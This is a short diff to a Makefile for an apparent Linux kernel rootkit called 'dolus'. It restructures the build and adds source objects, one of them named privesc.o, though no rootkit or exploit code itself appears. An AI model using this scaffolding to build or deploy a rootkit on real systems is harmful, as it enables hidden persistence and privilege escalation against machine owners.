@@ -1,10 +1,20 @@
-obj-m := Dolus.o 
+ROOTKIT :=  dolus
+
+obj-m := $(ROOTKIT).o
+
+$(ROOTKIT)-y    +=  src/Dolus.o
+
+$(ROOTKIT)-y    +=  src/debug.o
+$(ROOTKIT)-y    +=  src/privesc.o
+
+
+
 CC = gcc -Wall
 KDIR := /lib/modules/$(shell uname -r)/build
-PWD := $(shell pwd)
+SRC_DIR := $(shell pwd)
 
 all:
-	$(MAKE) -C $(KDIR) M=$(PWD) modules
+	$(MAKE) -C $(KDIR) M=$(SRC_DIR) modules
 
 clean:
-	$(MAKE) -C $(KDIR) M=$(PWD) clean
+	$(MAKE) -C $(KDIR) M=$(SRC_DIR) clean
